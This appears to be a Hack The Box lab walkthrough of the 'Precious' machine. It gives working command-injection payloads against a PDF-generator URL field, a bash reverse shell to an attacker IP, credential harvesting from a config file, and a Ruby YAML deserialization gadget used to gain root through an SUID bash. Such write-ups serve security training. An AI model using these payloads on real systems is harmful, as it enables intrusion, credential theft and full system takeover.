---
layout: post
author: H4-L0
---

![image](/images/Pasted image 20230102211824.png)

[Hack The Box - Precious](https://app.hackthebox.com/machines/Precious)

## Enumeration

### nmap

```shell
$ nmap -sV precious.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-28 15:00 EST
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

open ports:

- `22` ssh-service
- `80` nginx-webserver

we found no other directories or virtual hosts.

### web page

![image](/images/Pasted image 20230102212102.png)

the website tells us that we can convert a web page to a pdf file.
first we tested if it worked. we started a python webserver and served a html file with the same content as the website.

```shell
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![image](/images/Pasted image 20230102212459.png)

and it worked.

![image](/images/Pasted image 20230102212517.png)

thinking about how this might be implemented there is a chance that some OS binary is converting the html content. so our next step was to check for remote code execution vulnerability.

in the end we found we are getting some useful response from the server with this input schema.

## Exploit

```shell
url=http://10.10.14.207/$(id)
```

and our python server got this response. unfortunately we could not find out how to bypass the limitation of not using spaces.

```shell
10.10.11.189 - - [02/Jan/2023 15:35:07] code 404, message File not found
10.10.11.189 - - [02/Jan/2023 15:35:07] "GET /uid=1001(ruby)%20gid=1001(ruby)%20groups=1001(ruby) HTTP/1.1" 404 -
```

we found in the pdf response the tool and version number how the file is getting generated.

![image](/images/Pasted image 20230102213329.png)

a short google search got us a CVE

![image](/images/Pasted image 20230102213928.png)

we saw the CWE uses a url-encoded space before the actual command. so we tried this too.

![image](/images/Pasted image 20230102214123.png)

and it worked. we needed to urlencode the '%20' again and we can execute commands with spaces.

```shell
url=http://10.10.14.207/%2520$(cat+/etc/passwd)
```

response:

```shell
10.10.11.189 - - [02/Jan/2023 15:51:45] "GET /%20root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin%0Abin:x:2:2:bin:/bin:/usr/sbin/nologin%0Asys:x:3:3:sys:/dev:/usr/sbin/nologin%0Async:x:4:65534:sync:/bin:/bin/sync%0Agames:x:5:60:games:/usr/games:/usr/sbin/nologin%0Aman:x:6:12:man:/var/cache/man:/usr/sbin/nologin%0Alp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin%0Amail:x:8:8:mail:/var/mail:/usr/sbin/nologin%0Anews:x:9:9:news:/var/spool/news:/usr/sbin/nologin%0Auucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin%0Aproxy:x:13:13:proxy:/bin:/usr/sbin/nologin%0Awww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin%0Abackup:x:34:34:backup:/var/backups:/usr/sbin/nologin%0Alist:x:38:38:Mailing%20List%20Manager:/var/list:/usr/sbin/nologin%0Airc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin%0Agnats:x:41:41:Gnats%20Bug-Reporting%20System%20(admin):/var/lib/gnats:/usr/sbin/nologin%0Anobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin%0A_apt:x:100:65534::/nonexistent:/usr/sbin/nologin%0Asystemd-network:x:101:102:systemd%20Network%20Management,,,:/run/systemd:/usr/sbin/nologin%0Asystemd-resolve:x:102:103:systemd%20Resolver,,,:/run/systemd:/usr/sbin/nologin%0Amessagebus:x:103:109::/nonexistent:/usr/sbin/nologin%0Asshd:x:104:65534::/run/sshd:/usr/sbin/nologin%0Ahenry:x:1000:1000:henry,,,:/home/henry:/bin/bash%0Asystemd-timesync:x:999:999:systemd%20Time%20Synchronization:/:/usr/sbin/nologin%0Asystemd-coredump:x:998:998:systemd%20Core%20Dumper:/:/usr/sbin/nologin%0Aruby:x:1001:1001::/home/ruby:/bin/bash%0A_laurel:x:997:997::/var/log/laurel:/bin/false HTTP/1.1" 404 -
```

### reverse shell

next getting a reverse shell:
first setting up a listener with `nc -lvnp 4444`

and execute the shell with this url parameter

```shell
url=http://10.10.14.207/%2520$(bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.207/4444+0>%261')
```

```shell
listening on [any] 4444 ...
connect to [10.10.14.207] from (UNKNOWN) [10.10.11.189] 47766
bash: cannot set terminal process group (679): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$
```

shell stabalizing:

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

CTRL+Z

stty raw -echo; fg
```

## Privilege Escalation

we found the `user.txt` in `henrys` home folder but we have no permission to open it.

```shell
ruby@precious:/home/henry$ ls -la
total 24
drwxr-xr-x 2 henry henry 4096 Oct 26 08:28 .
drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc
-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile
-rw-r----- 1 root  henry   33 Jan  2 15:43 user.txt
ruby@precious:/home/henry$ cat user.txt
cat: user.txt: Permission denied
```

the other home directory of `ruby` had a few more folders to search through.

```shell
ruby@precious:/home$ cd ruby/
ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Jan  2 15:50 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Jan  2 15:50 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

and we found a config file with credentials.

```shell
ruby@precious:~$ cd .bundle/
ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3**************FH"

```

logging back in with `henrys` credentials

```shell
$ ssh henry@precious.htb
henry@precious.htb's password:
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$
```

first we grab the first flag:

![image](/images/Pasted image 20230102222557.png)

## Getting Root

next we are checking our sudo rights and got this output.

```shell
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

we are allowed to run a ruby script. lets check its contents.

![image](/images/Pasted image 20230102222510.png)

it seems it externally loads a yaml file. lets try to find if `YAML.load` is vulnerable

after a bit of googling we found a yaml snippet that worked.

[ruby yaml exploit](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml)

```shell
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

output after executing the script with this snippet saved as `dependencies.yml`

```shell
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
...
```

where the command `id` is typed we need to input our root commands. lets get a root shell.

```shell
...
	git_set: chmod u+s /bin/bash
...
```

first we set suid bit for bash binary.

```shell
...
	git_set: /bin/bash
...
```

then executed the binary and got a root shell.

```shell
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root@precious:/home/henry# id
uid=0(root) gid=0(root) groups=0(root)
```

navigating to the root directory and there is the root flag.

```shell
root@precious:/home/henry# cd /root
root@precious:~# ls
root.txt
root@precious:~# cat root.txt
b481*************************6ad
```

done.

[H4] & [L0]
